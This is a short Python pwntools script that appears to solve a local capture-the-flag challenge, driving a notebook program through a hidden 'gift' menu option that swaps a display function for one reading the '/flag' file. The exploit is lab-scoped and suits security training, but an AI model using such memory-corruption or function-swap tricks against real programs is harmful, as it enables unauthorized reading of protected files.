#!/usr/bin/python

import pwn

def readlines(proc):
    try:
        lines = proc.recvlines(timeout=0.01)
        for line in lines:
            print(line.decode())
    except:
        pass
def send_payload(proc, payload):
    proc.send_raw(payload)
    print(payload)
    readlines(proc)

proc = pwn.process("/challenge/buffer-overflow-level2.1")
readlines(proc)

send_payload(proc, b"1\n") # create_notebook
send_payload(proc, b"0\n") # index
send_payload(proc, b"16\n") # size
send_payload(proc, b"/flag\x00") # cont
send_payload(proc, b"666\n") # gift 将show_content替换为read_flag
send_payload(proc, b"0\n") # index
send_payload(proc, b"4\n") # show_notebook
send_payload(proc, b"0\n") # index

print(proc.recv())